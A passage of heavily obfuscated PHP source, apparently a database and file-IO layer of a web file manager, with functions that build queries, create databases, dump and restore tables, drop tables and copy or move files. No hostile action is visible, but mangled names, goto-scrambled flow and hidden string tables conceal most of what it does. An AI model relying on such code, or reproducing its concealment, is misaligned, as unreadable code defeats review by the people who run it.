$this->execute($bƒÉæ¶×÷ä, $this->parseBind(!empty($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[281]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[281]] : array())); } public function select($añ”¼Æ†• = array()) { goto B†—˜Õ¬£; Dö±ÈƒÖÕç: $AÚÛœšä— = isset($añ”¼Æ†•[$BÔ¶ó¾ñ[345]]) ? $añ”¼Æ†•[$BÔ¶ó¾ñ[345]] : !1; if ($AÚÛœšä—) { $f¤Ñ¸É¹Á = is_string($AÚÛœšä—[$BÔ¶ó¾ñ[92]]) ? $AÚÛœšä—[$BÔ¶ó¾ñ[92]] : $BÔ¶ó¾ñ[976] . md5($FĞç®ˆ¾”Ÿ); $a”ƒàƒ¡¢“ = think_cache($f¤Ñ¸É¹Á, $BÔ¶ó¾ñ[33], $AÚÛœšä—); if (!1 !== $a”ƒàƒ¡¢“) { return $a”ƒàƒ¡¢“; } } $EÌ˜¡µÇõæ = $this->query($FĞç®ˆ¾”Ÿ, $this->parseBind(!empty($añ”¼Æ†•[$BÔ¶ó¾ñ[281]]) ? $añ”¼Æ†•[$BÔ¶ó¾ñ[281]] : array())); goto e­Åí‡Ü»…; B†—˜Õ¬£: $BÔ¶ó¾ñ =& $_SERVER[¹Ò‹Ò¹]; $this->model = $añ”¼Æ†•[$BÔ¶ó¾ñ[277]]; $FĞç®ˆ¾”Ÿ = $this->buildSelectSql($añ”¼Æ†•); goto Dö±ÈƒÖÕç; e­Åí‡Ü»…: if ($AÚÛœšä— && !1 !== $EÌ˜¡µÇõæ) { think_cache($f¤Ñ¸É¹Á, $EÌ˜¡µÇõæ, $AÚÛœšä—); } return $EÌ˜¡µÇõæ; goto dÅÑ£âêÂ; dÅÑ£âêÂ: } public function buildSelectSql($E…«à»à” = array()) { goto dÉÖ¥Šª­×; dÉÖ¥Šª­×: $eùó´¡í‚ =& $_SERVER[¹Ò‹Ò¹]; if (isset($E…«à»à”[$eùó´¡í‚[349]])) { if (strpos($E…«à»à”[$eùó´¡í‚[349]], $eùó´¡í‚[47])) { list($dË¨ÄÌëÛ«, $AÆ¡å‘®–Ú) = explode($eùó´¡í‚[47], $E…«à»à”[$eùó´¡í‚[349]]); } else { $dË¨ÄÌëÛ« = $E…«à»à”[$eùó´¡í‚[349]]; } $dË¨ÄÌëÛ« = $dË¨ÄÌëÛ« ? $dË¨ÄÌëÛ« : 1; $AÆ¡å‘®–Ú = isset($AÆ¡å‘®–Ú) ? $AÆ¡å‘®–Ú : (is_numeric($E…«à»à”[$eùó´¡í‚[288]]) ? $E…«à»à”[$eùó´¡í‚[288]] : 20); $D°–’×ƒ” = $AÆ¡å‘®–Ú * ((int) $dË¨ÄÌëÛ« - 1); $E…«à»à”[$eùó´¡í‚[288]] = $D°–’×ƒ” . $eùó´¡í‚[47] . $AÆ¡å‘®–Ú; } if (think_config($eùó´¡í‚[977])) { $aŸ‚ä‹íö = $eùó´¡í‚[978] . md5(serialize($E…«à»à”)); $c—àÔÊ®¡À = think_cache($aŸ‚ä‹íö); if ($c—àÔÊ®¡À) { return $c—àÔÊ®¡À; } } goto AÖ¬ÇìŠ…‰; e¶“ÑƒàÁã: return $dÚ§Ö¦˜©; goto E±¸š·Ù¶‘; AÖ¬ÇìŠ…‰: $dÚ§Ö¦˜© = $this->parseSql($this->selectSql, $E…«à»à”); $dÚ§Ö¦˜© .= $this->parseLock(isset($E…«à»à”[$eùó´¡í‚[791]]) ? $E…«à»à”[$eùó´¡í‚[791]] : !1); if (isset($aŸ‚ä‹íö)) { think_cache($aŸ‚ä‹íö, $dÚ§Ö¦˜©); } goto e¶“ÑƒàÁã; E±¸š·Ù¶‘: } public function parseSql($d›Âêğ©é, $Cƒ—ğ¸©¬ä = array()) { $DÂ¸Ô—ë®‰ =& $_SERVER[¹Ò‹Ò¹]; $d›Âêğ©é = str_replace(array($DÂ¸Ô—ë®‰[979], $DÂ¸Ô—ë®‰[980], $DÂ¸Ô—ë®‰[981], $DÂ¸Ô—ë®‰[982], $DÂ¸Ô—ë®‰[983], $DÂ¸Ô—ë®‰[984], $DÂ¸Ô—ë®‰[985], $DÂ¸Ô—ë®‰[986], $DÂ¸Ô—ë®‰[987], $DÂ¸Ô—ë®‰[988], $DÂ¸Ô—ë®‰[989]), array($this->parseTable("{$Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[275]]}"), $this->parseDistinct(isset($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[990]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[990]] : !1), $this->parseField(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[269]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[269]] : $DÂ¸Ô—ë®‰[181]), $this->parseJoin(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[278]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[278]] : $DÂ¸Ô—ë®‰[33]), $this->parseWhere(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[271]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[271]] : $DÂ¸Ô—ë®‰[33]), $this->parseGroup(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[991]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[991]] : $DÂ¸Ô—ë®‰[33]), $this->parseHaving(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[992]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[992]] : $DÂ¸Ô—ë®‰[33]), $this->parseOrder(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[361]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[361]] : $DÂ¸Ô—ë®‰[33]), $this->parseLimit(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[288]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[288]] : $DÂ¸Ô—ë®‰[33]), $this->parseUnion(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[343]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[343]] : $DÂ¸Ô—ë®‰[33]), $this->parseComment(!empty($Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[350]]) ? $Cƒ—ğ¸©¬ä[$DÂ¸Ô—ë®‰[350]] : $DÂ¸Ô—ë®‰[33])), $d›Âêğ©é); return $d›Âêğ©é; } public function getLastSql($A‹õÓô÷ö = '') { return $A‹õÓô÷ö ? $this->modelSql[$A‹õÓô÷ö] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($FÈ¾‹³‹¼á) { return addslashes($FÈ¾‹³‹¼á); } public function setModel($aë»èÖ¯«) { $this->model = $aë»èÖ¯«; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($D©ÅÆ¥î, $eùæÓ…‘èŞ = '') { $this->database = $D©ÅÆ¥î; $this->type = $eùæÓ…‘èŞ; } public function model($a»ñÃÓ ’ = '') { return new ModelBase($a»ñÃÓ ’, $_SERVER[¹Ò‹Ò¹][33], $this->database); } public function db($dùÚä£…‹ = false) { goto d“ÆÇ¼¶¢; cùàÁ–Èªè: $this->database = $C³è×íì„Á; $F‹‰ÔŸè©Ô = $this->model()->db(); try { $C®†Ìù—¿ = $F‹‰ÔŸè©Ô->execute("\163\x68\157\x77\40\x64\x61\x74\x61\x62\x61\163\145\x73\x20\154\151\153\145\40\47{$Dåö…™ƒˆ‹}\x27"); } catch (Exception $b£‹´îñ›ï) { } goto dè¾Ç‘÷“ø; b¹³ÇÆÈæ¿: $Dåö…™ƒˆ‹ = $C³è×íì„Á[$c˜ÍãÓäÆ[905]]; $C³è×íì„Á[$c˜ÍãÓäÆ[905]] = $c˜ÍãÓäÆ[33]; if ($C³è×íì„Á[$c˜ÍãÓäÆ[739]] == $c˜ÍãÓäÆ[740]) { $b¸Ô¨œËÓ = $C³è×íì„Á[$c˜ÍãÓäÆ[741]]; $C³è×íì„Á[$c˜ÍãÓäÆ[741]] = substr($b¸Ô¨œËÓ, 0, strrpos($b¸Ô¨œËÓ, $c˜ÍãÓäÆ[993])); } goto cùàÁ–Èªè; e‚ëŒ î¶…: $this->database = $C³è×íì„Á; $F‹‰ÔŸè©Ô->execute("\165\163\145\x20\x60{$Dåö…™ƒˆ‹}\x60"); return $F‹‰ÔŸè©Ô; goto fõ×†˜Ş ; dè¾Ç‘÷“ø: if (!$C®†Ìù—¿) { $F‹‰ÔŸè©Ô->execute("\x63\162\x65\141\164\145\40\144\x61\x74\141\142\x61\x73\x65\x20\x60{$Dåö…™ƒˆ‹}\x60"); } $C³è×íì„Á[$c˜ÍãÓäÆ[905]] = $Dåö…™ƒˆ‹; if ($C³è×íì„Á[$c˜ÍãÓäÆ[739]] == $c˜ÍãÓäÆ[740]) { $C³è×íì„Á[$c˜ÍãÓäÆ[741]] .= $c˜ÍãÓäÆ[993] . $Dåö…™ƒˆ‹; } goto e‚ëŒ î¶…; d“ÆÇ¼¶¢: $c˜ÍãÓäÆ =& $_SERVER[¹Ò‹Ò¹]; $C³è×íì„Á = array_change_key_case($this->database); if ($this->type == $c˜ÍãÓäÆ[9] || !$dùÚä£…‹) { return $this->model()->db(); } goto b¹³ÇÆÈæ¿; fõ×†˜Ş : } public function createTable($Cã‰‰Œ¨Ü¹, $bëÄè¯öˆ = null) { $dÂÛ¡ä»› =& $_SERVER[¹Ò‹Ò¹]; if (!IO::exist($Cã‰‰Œ¨Ü¹)) { ActionCall($dÂÛ¡ä»›[994], !0, 0); show_json(LNG($dÂÛ¡ä»›[995]), !1); } $BÍŠäçÛÍ = sqlSplit(IO::getContent($Cã‰‰Œ¨Ü¹)); foreach ($BÍŠäçÛÍ as $d®†êÏÅŠ¡) { if ($bëÄè¯öˆ) { $B‹ßî—õ§ = stripos($d®†êÏÅŠ¡, $dÂÛ¡ä»›[996]) === 0; if ($B‹ßî—õ§) { $bëÄè¯öˆ->task[$dÂÛ¡ä»›[997]] += 1; } } $this->model()->db()->execute($d®†êÏÅŠ¡); if ($bëÄè¯öˆ && $B‹ßî—õ§) { preg_match($dÂÛ¡ä»›[998], $d®†êÏÅŠ¡, $FÆäÄï…œÕ); $bëÄè¯öˆ->task[$dÂÛ¡ä»›[999]] = $FÆäÄï…œÕ[1]; $bëÄè¯öˆ->update(1); } } $this->taskToCache($bëÄè¯öˆ); } public function insertTable($B‹‰›±ì­É, $CÔä½Û±Ï = null) { $Eíš¢¢‹â =& $_SERVER[¹Ò‹Ò¹]; $E…ÙôÆ”ˆ = $this->model()->db(); $eö¾ê††ğ = $B†„«Çö£ ? array($B†„«Çö£) : $E…ÙôÆ”ˆ->getTables(); foreach ($B‹‰›±ì­É as $BÛ¾Óæš·³) { $B†„«Çö£ = basename($BÛ¾Óæš·³, $Eíš¢¢‹â[732]); if (!in_array($B†„«Çö£, $eö¾ê††ğ)) { continue; } if ($CÔä½Û±Ï) { $CÔä½Û±Ï->task[$Eíš¢¢‹â[999]] = $B†„«Çö£; } if (get_filesize($BÛ¾Óæš·³) == 0) { continue; } $BÕòâõÊ°ß = $this->sqlToDb($BÛ¾Óæš·³, $CÔä½Û±Ï); if (!$BÕòâõÊ°ß) { ActionCall($Eíš¢¢‹â[994], !0, 0); show_json(LNG($Eíš¢¢‹â[1000]) . "\x5b{$B†„«Çö£}\x5d", !1); } } $this->taskToCache($CÔä½Û±Ï); } public function sqlFromDb($F¿Ù•–Ÿ«›, $B¶ÏÍºÙÉÂ, $fÂ§»„‘è = null, $fÄëß öÁî = null) { goto bšÈ¤¸¼ƒ†; E‹Ã‚ØĞ: $D·Ü‘‹ôÔ˜ = 1; $eÎùÛìéó‰ = 500; $CÌœ„ˆöš² = fopen($B¶ÏÍºÙÉÂ, $_SERVER[¹Ò‹Ò¹][1001]); goto aë…ôÖ„¼Û; aë…ôÖ„¼Û: $f²‚Š™ô«Ã = $e¾³ø­»©->getPk(); $c§›Á·µÏ = $e¾³ø­»©->getDbFields(); do { $cÂìÆ„»İí = $e¾³ø­»©->field($c§›Á·µÏ)->order($f²‚Š™ô«Ã . $_SERVER[¹Ò‹Ò¹][1002])->selectPage($eÎùÛìéó‰, $D·Ü‘‹ôÔ˜); $a¥„–å¥½² = isset($cÂìÆ„»İí[$_SERVER[¹Ò‹Ò¹][362]][$_SERVER[¹Ò‹Ò¹][364]]) ? $cÂìÆ„»İí[$_SERVER[¹Ò‹Ò¹][362]][$_SERVER[¹Ò‹Ò¹][364]] : 0; $C¾í›İÆ = !empty($cÂìÆ„»İí[$_SERVER[¹Ò‹Ò¹][365]]) ? $cÂìÆ„»İí[$_SERVER[¹Ò‹Ò¹][365]] : array(); if (!($BÇ˜¸øœ¡µ = count($C¾í›İÆ))) { break; } $AºÚºˆ©ËÎ = array(); foreach ($C¾í›İÆ as $E™®Û‚Ò) { if ($F¿Ù•–Ÿ«› == $_SERVER[¹Ò‹Ò¹][1003] && $E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][29]] == $_SERVER[¹Ò‹Ò¹][1004]) { $AÓŠÃÂÕ = json_decode($E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][370]], !0); if ($AÓŠÃÂÕ[$_SERVER[¹Ò‹Ò¹][28]] == date($_SERVER[¹Ò‹Ò¹][705]) && !$AÓŠÃÂÕ[$_SERVER[¹Ò‹Ò¹][704]]) { continue; } } if ($fÄëß öÁî) { $E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][75]] = "\173\x69\157\x3a{$fÄëß öÁî}\175" . substr($E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][75]], strlen("\173\x69\157\x3a{$E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][762]]}\x7d")); $E™®Û‚Ò[$_SERVER[¹Ò‹Ò¹][762]] = $fÄëß öÁî; } $AºÚºˆ©ËÎ[] = $_SERVER[¹Ò‹Ò¹][1005] . $this->sqlEncode($E™®Û‚Ò) . $_SERVER[¹Ò‹Ò¹][1006]; } $dÕÉ×óÃ© = "\111\116\123\105\x52\124\40\111\116\124\x4f\x20\140{$F¿Ù•–Ÿ«›}\x60\40\x28\140" . implode($_SERVER[¹Ò‹Ò¹][1007], $c§›Á·µÏ) . $_SERVER[¹Ò‹Ò¹][1008]; fwrite($CÌœ„ˆöš², $dÕÉ×óÃ© . implode($_SERVER[¹Ò‹Ò¹][1009], $AºÚºˆ©ËÎ) . $_SERVER[¹Ò‹Ò¹][67] . PHP_EOL); $D·Ü‘‹ôÔ˜++; $EŠºÄÏØá‘ += $BÇ˜¸øœ¡µ; if ($fÂ§»„‘è) { $fÂ§»„‘è->update($BÇ˜¸øœ¡µ); } } while ($D·Ü‘‹ôÔ˜ <= $a¥„–å¥½²); goto Cóàß©¾Ä; Cóàß©¾Ä: fclose($CÌœ„ˆöš²); return $EŠºÄÏØá‘; goto Fœ…™¯â½; bšÈ¤¸¼ƒ†: if ($fÂ§»„‘è) { $fÂ§»„‘è->task[$_SERVER[¹Ò‹Ò¹][999]] = $F¿Ù•–Ÿ«›; } $e¾³ø­»© = $this->model($F¿Ù•–Ÿ«›); $EŠºÄÏØá‘ = 0; goto E‹Ã‚ØĞ; Fœ…™¯â½: } public function sqlToDb($d…§ÕŒÍÎ†, $a¾×°·¿“Ä = null) { goto E¯ÅÜ™‹„š; E×«…â£¨: if (trim($F³Ø÷÷ƒŠø)) { $F³Ø÷÷ƒŠø = rtrim(trim($F³Ø÷÷ƒŠø), $Bè·œôØåî[67]); if (!$eó÷›©º•³->execute($F³Ø÷÷ƒŠø)) { return !1; } if ($a¾×°·¿“Ä) { $a¾×°·¿“Ä->update($CÊ¿È©ÍƒÛ - 1); } } return !0; goto aØÇ£ØÅœ; f™ÏàÂµİ”: if (!$dóØ‰¢İ‘â) { return !1; } $CÊ¿È©ÍƒÛ = 0; $F³Ø÷÷ƒŠø = $Bè·œôØåî[33]; goto fƒ•“¶õº†; E¯ÅÜ™‹„š: $Bè·œôØåî =& $_SERVER[¹Ò‹Ò¹]; $eó÷›©º•³ = $this->model()->db(); $dóØ‰¢İ‘â = @fopen($d…§ÕŒÍÎ†, $Bè·œôØåî[1010]); goto f™ÏàÂµİ”; fƒ•“¶õº†: $e†ÉÕÈˆÌß = 500 + 1; while (!feof($dóØ‰¢İ‘â)) { if ($a¾×°·¿“Ä && $CÊ¿È©ÍƒÛ != 0) { $a¾×°·¿“Ä->task[$Bè·œôØåî[997]] += 1; } $CÊ¿È©ÍƒÛ++; $f¥˜ËÂõŞ = trim(fgets($dóØ‰¢İ‘â)); $F³Ø÷÷ƒŠø .= $Bè·œôØåî[50] . $this->sqlDecode($f¥˜ËÂõŞ, $this->type); if ($CÊ¿È©ÍƒÛ == $e†ÉÕÈˆÌß) { $F³Ø÷÷ƒŠø = rtrim(trim($F³Ø÷÷ƒŠø), $Bè·œôØåî[67]); if (!$eó÷›©º•³->execute($F³Ø÷÷ƒŠø)) { return !1; } if ($a¾×°·¿“Ä) { $a¾×°·¿“Ä->update($CÊ¿È©ÍƒÛ - 1); } $F³Ø÷÷ƒŠø = $Bè·œôØåî[33]; $CÊ¿È©ÍƒÛ = 0; } } fclose($dóØ‰¢İ‘â); goto E×«…â£¨; aØÇ£ØÅœ: } public function dropTable($c„¶ÓºµäÄ = null) { $CÒëÀ£¡‡š = $this->model()->db(); $F«ÀñµÈá† = $c„¶ÓºµäÄ ? array($c„¶ÓºµäÄ) : $CÒëÀ£¡‡š->getTables(); if (!$F«ÀñµÈá†) { return; } foreach ($F«ÀñµÈá† as $c„¶ÓºµäÄ) { $CÒëÀ£¡‡š->execute("\144\162\157\x70\x20\164\141\x62\x6c\x65\x20\151\x66\x20\145\x78\x69\x73\x74\x73\40\140{$c„¶ÓºµäÄ}\140"); } } private function taskToCache($dîíÃÎß = null) { $Aè®¨Ö­ß =& $_SERVER[¹Ò‹Ò¹]; if (!$dîíÃÎß) { return; } $fÙ«…âÃƒç = array($Aè®¨Ö­ß[999] => $dîíÃÎß->task[$Aè®¨Ö­ß[999]], $Aè®¨Ö­ß[997] => $dîíÃÎß->task[$Aè®¨Ö­ß[997]], $Aè®¨Ö­ß[1011] => $dîíÃÎß->task[$Aè®¨Ö­ß[1011]]); if ($fÙ«…âÃƒç[$Aè®¨Ö­ß[997]] == $fÙ«…âÃƒç[$Aè®¨Ö­ß[1011]]) { $fÙ«…âÃƒç[$Aè®¨Ö­ß[711]] = 1; } Cache::set($Aè®¨Ö­ß[1012] . $dîíÃÎß->task[$Aè®¨Ö­ß[388]], $fÙ«…âÃƒç); $dîíÃÎß->end(); } private function sqlEncode($cÍÁïĞ“ÓÁ) { $d‡¦‘‚·ˆÔ =& $_SERVER[¹Ò‹Ò¹]; $BĞ—Œ©äœÛ = array(); foreach ($cÍÁïĞ“ÓÁ as $côËË´—’) { if (is_array($côËË´—’)) { $côËË´—’ = json_encode_force($côËË´—’); } $côËË´—’ = addslashes($côËË´—’); $côËË´—’ = str_replace(array($d‡¦‘‚·ˆÔ[1013], $d‡¦‘‚·ˆÔ[227]), array($d‡¦‘‚·ˆÔ[1014], $d‡¦‘‚·ˆÔ[1015]), $côËË´—’); $BĞ—Œ©äœÛ[] = str_replace($d‡¦‘‚·ˆÔ[55], $d‡¦‘‚·ˆÔ[1016], $côËË´—’); } return $d‡¦‘‚·ˆÔ[55] . implode($d‡¦‘‚·ˆÔ[1017], $BĞ—Œ©äœÛ) . $d‡¦‘‚·ˆÔ[55]; } private function sqlDecode($CìÀ…ÕÃ³ò, $e³½¡˜ õ) { $A†‰Èƒ÷®‚ =& $_SERVER[¹Ò‹Ò¹]; $CìÀ…ÕÃ³ò = str_replace(array($A†‰Èƒ÷®‚[1014], $A†‰Èƒ÷®‚[1015]), array($A†‰Èƒ÷®‚[1013], $A†‰Èƒ÷®‚[227]), $CìÀ…ÕÃ³ò); if ($e³½¡˜ õ == $A†‰Èƒ÷®‚[9]) { $CìÀ…ÕÃ³ò = stripslashes($CìÀ…ÕÃ³ò); } return $CìÀ…ÕÃ³ò; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cŒîß’Ø½¶, $Fï³Ö–ğ»Ş) { goto BŒÏ¨Í§Ä; BŒÏ¨Í§Ä: $bŠìØ¼šæÙ =& $_SERVER[¹Ò‹Ò¹]; $F‡Ì§ƒÚÚ¶ = $Fï³Ö–ğ»Ş; $GLOBALS[$bŠìØ¼šæÙ[1018]] = $bŠìØ¼šæÙ[1019] . $cŒîß’Ø½¶; goto bÊÉ•­ÃÁã; A‘ƒ··ˆ˜Â: Hook::trigger($bŠìØ¼šæÙ[1019] . $cŒîß’Ø½¶ . $bŠìØ¼šæÙ[1022], $F‡Ì§ƒÚÚ¶, $a¢Ï®½‡Í•); return $a¢Ï®½‡Í•; goto AÓ–—í®†Ê; bÊÉ•­ÃÁã: Hook::trigger($bŠìØ¼šæÙ[1019] . $cŒîß’Ø½¶ . $bŠìØ¼šæÙ[1020], $F‡Ì§ƒÚÚ¶); $F¦Îˆ‡‘ğ‰ = self::driverMake($Fï³Ö–ğ»Ş[0]); if (method_exists($F¦Îˆ‡‘ğ‰, $cŒîß’Ø½¶)) { $a¢Ï®½‡Í• = @call_user_func_array(array($F¦Îˆ‡‘ğ‰, $cŒîß’Ø½¶), $Fï³Ö–ğ»Ş); } else { if (method_exists($F¦Îˆ‡‘ğ‰, $bŠìØ¼šæÙ[1021])) { $a¢Ï®½‡Í• = @call_user_func_array(array($F¦Îˆ‡‘ğ‰, $cŒîß’Ø½¶), $Fï³Ö–ğ»Ş); } else { if (method_exists(self, $cŒîß’Ø½¶)) { $a¢Ï®½‡Í• = @call_user_func_array(array(self, $cŒîß’Ø½¶), $Fï³Ö–ğ»Ş); } else { $a¢Ï®½‡Í• = call_user_func_array(array(parent, $cŒîß’Ø½¶), $Fï³Ö–ğ»Ş); } } } goto A‘ƒ··ˆ˜Â; AÓ–—í®†Ê: } public static function init($bÖ¢ÃÓÉÕ) { return self::driverMake($bÖ¢ÃÓÉÕ); } public static function copy($B¹İÒöáí, $cº–Œ‹÷Ô¢, $c‹®À˜›¹­ = false, $AõæÓµî”ê = false) { return self::copyMoveStart($B¹İÒöáí, $cº–Œ‹÷Ô¢, $c‹®À˜›¹­, $_SERVER[¹Ò‹Ò¹][513], $AõæÓµî”ê); } public static function move($cö¾ÒœÄÛ‚, $d„é÷Õ†…, $e•×­ŞÛÌ£ = false, $eÛó¸ˆø·È = false) { return self::copyMoveStart($cö¾ÒœÄÛ‚, $d„é÷Õ†…, $e•×­ŞÛÌ£, $_SERVER[¹Ò‹Ò¹][515], $eÛó¸ˆø·È); } private static function copyMoveStart($FÒÎî¤Û», $AñÃ–Á‰ƒ, $Bá³ï…“ø›, $BèÑ¶ä¸œ›, $DËàõà¨¤ä) { $dÆœãÁ»À =& $_SERVER[¹Ò‹Ò¹]; $C˜¡Ÿ•‘í– = array($FÒÎî¤Û», $AñÃ–Á‰ƒ, $Bá³ï…“ø›, $DËàõà¨¤ä); Hook::trigger($dÆœãÁ»À[1019] . $BèÑ¶ä¸œ› . $dÆœãÁ»À[1020], $C˜¡Ÿ•‘í–); $cØ‡Ô¦ßğç = self::copyMove($FÒÎî¤Û», $AñÃ–Á‰ƒ, $Bá³ï…“ø›, $BèÑ¶ä¸œ›, $DËàõà¨¤ä); Hook::trigger($dÆœãÁ»À[1019] . $BèÑ¶ä¸œ› . $dÆœãÁ»À[1022], $C˜¡Ÿ•‘í–, $cØ‡Ô¦ßğç); return $cØ‡Ô¦ßğç; } public static function saveFile($DÚ•¾‚¡Ü, $eí¬ÄõóçŒ, $AØ¿í»‰ˆö = true) { goto Aâ÷¼ ²ÏÒ; aŞ×‚…ğË¼: $FÙËòÒª“¨ = self::copyFile($dÚ¾¤„×‡‰, $DÚ•¾‚¡Ü, $BìªíŒÓ²Ö, $b¡ˆœ˜Ö¼, $CÛŸ—œ¾É[$D ‚ëÁó‚ö[28]], $AÛÇÉˆ¨Í); if ($aöğöàù±ª) { $FÙËòÒª“¨ = $aöğöàù±ª->getPathOuter($FÙËòÒª“¨); } return $FÙËòÒª“¨; goto AâÒİÔœˆø; aß†ìÍŒğ“: $b¡ˆœ˜Ö¼ = $BìªíŒÓ²Ö->pathFather($eí¬ÄõóçŒ); $AÛÇÉˆ¨Í = !0; if (!$AØ¿í»‰ˆö && self::driverIsSame($dÚ¾¤„×‡‰, $BìªíŒÓ²Ö)) { $AÛÇÉˆ¨Í = !1; } goto aŞ×‚…ğË¼; Aâ÷¼ ²ÏÒ: $D ‚ëÁó‚ö =& $_SERVER[¹Ò‹Ò¹]; $CÛŸ—œ¾É = self::info($eí¬ÄõóçŒ); $dÚ¾¤„×‡‰ = self::driverMake($DÚ•¾‚¡Ü); goto cÃÀ×­ÚÍ; cÃÀ×­ÚÍ: $BìªíŒÓ²Ö = self::driverMake($eí¬ÄõóçŒ); $aöğöàù±ª = !1; if ($BìªíŒÓ²Ö->pathParse[$D ‚ëÁó‚ö[1023]]) { $bØ°¾¢Œ‹Ó = $BìªíŒÓ²Ö->pathParse[$D ‚ëÁó‚ö[1023]]; $aöğöàù±ª = $BìªíŒÓ²Ö; $BìªíŒÓ²Ö = self::driverMake($bØ°¾¢Œ‹Ó); } goto aß†ìÍŒğ“; AâÒİÔœˆø: } private static function copyMove($bêŒŸ…ºì‚, $d÷ä¾¸ÖÍ, $bµ¡ŞŠÅ¶, $FÊƒ«¾Ûª´, $AØ ê„®‘ä = false) { goto fŒÂ†Ê«¢©; D£‚…£Öë: $bÅÅÕÌÆ™ö = $FÖç×¤“ó²->isFile($bêŒŸ…ºì‚); if (!$bÅÅÕÌÆ™ö && $A£ÈÓÉÒÖ‚->getType() == $EÂ¥³«ùİõ[709] && $FÖç×¤“ó²->getType() == $EÂ¥³«ùİõ[105]) { $F‡÷Ãµ’Ö» = $A£ÈÓÉÒÖ‚->copyFolderFromIO($FÖç×¤“ó², $bêŒŸ…ºì‚, $d÷ä¾¸ÖÍ, $bµ¡ŞŠÅ¶, $BØ‘Ù‚—Ä‹, $AØ ê„®‘ä); } else { $F‡÷Ãµ’Ö» = self::copyPath($FÖç×¤“ó², $bêŒŸ…ºì‚, $A£ÈÓÉÒÖ‚, $d÷ä¾¸ÖÍ, $bµ¡ŞŠÅ¶, $BØ‘Ù‚—Ä‹, $bÅÅÕÌÆ™ö, $AØ ê„®‘ä); } if ($F‡÷Ãµ’Ö» && $BØ‘Ù‚—Ä‹) { $FÖç×¤“ó²->remove($bêŒŸ…ºì‚); } goto DÈÅƒÏß¿¥; fŒÂ†Ê«¢©: $EÂ¥³«ùİõ =& $_SERVER[¹Ò‹Ò¹]; if (!$bêŒŸ…ºì‚ || $bêŒŸ…ºì‚ == $EÂ¥³«ùİõ[8] || !$d÷ä¾¸ÖÍ) { return !1; } ignore_timeout(); goto b£’¸ò‰Íæ; dØ¿‰²‚òÚ: $Dº¸Æí†Ü¼ = !1; if ($A£ÈÓÉÒÖ‚->pathParse[$EÂ¥³«ùİõ[1023]]) { $d÷ä¾¸ÖÍ = $A£ÈÓÉÒÖ‚->pathParse[$EÂ¥³«ùİõ[1023]]; $Dº¸Æí†Ü¼ = $A£ÈÓÉÒÖ‚; $A£ÈÓÉÒÖ‚ = self::driverMake($d÷ä¾¸ÖÍ); } self::check($FÖç×¤“ó², $bêŒŸ…ºì‚, $A£ÈÓÉÒÖ‚, $d÷ä¾¸ÖÍ); goto dÒº†íâƒ¦; DÈÅƒÏß¿¥: if ($Dº¸Æí†Ü¼) { $F‡÷Ãµ’Ö» = $Dº¸Æí†Ü¼->getPathOuter($F‡÷Ãµ’Ö»); } return $F‡÷Ãµ’Ö»; goto cÆïç¨Ş¤; dÒº†íâƒ¦: Hook::trigger($EÂ¥³«ùİõ[72], $FÖç×¤“ó², $bêŒŸ…ºì‚, $A£ÈÓÉÒÖ‚, $d÷ä¾¸ÖÍ); $A¤¤„õ°ƒ = self::driverIsSame($FÖç×¤“ó², $A£ÈÓÉÒÖ‚); if ($A¤¤„õ°ƒ) { if ($FÊƒ«¾Ûª´ == $EÂ¥³«ùİõ[515] && !method_exists($A£ÈÓÉÒÖ‚, $EÂ¥³«ùİõ[1024]) && trim($d÷ä¾¸ÖÍ, $EÂ¥³«ùİõ[8]) == trim($A£ÈÓÉÒÖ‚->pathFather($bêŒŸ…ºì‚), $EÂ¥³«ùİõ[8])) { if ($FÖç×¤“ó²->pathThis($bêŒŸ…ºì‚) != $AØ ê„®‘ä && !$FÖç×¤“ó²->isTypeObject()) { return $FÖç×¤“ó²->rename($bêŒŸ…ºì‚, $AØ ê„®‘ä); } return $A£ÈÓÉÒÖ‚->getPathOuter($bêŒŸ…ºì‚); } if (method_exists($A£ÈÓÉÒÖ‚, $FÊƒ«¾Ûª´)) { return $A£ÈÓÉÒÖ‚->{$FÊƒ«¾Ûª´}($bêŒŸ…ºì‚, $d÷ä¾¸ÖÍ, $bµ¡ŞŠÅ¶); } } goto D£‚…£Öë; b£’¸ò‰Íæ: $FÖç×¤“ó² = self::driverMake($bêŒŸ…ºì‚); $A£ÈÓÉÒÖ‚ = self::driverMake($d÷ä¾¸ÖÍ); $BØ‘Ù‚—Ä‹ = $FÊƒ«¾Ûª´ == $EÂ¥³«ùİõ[515]; goto dØ¿‰²‚òÚ; cÆïç¨Ş¤: } private static function 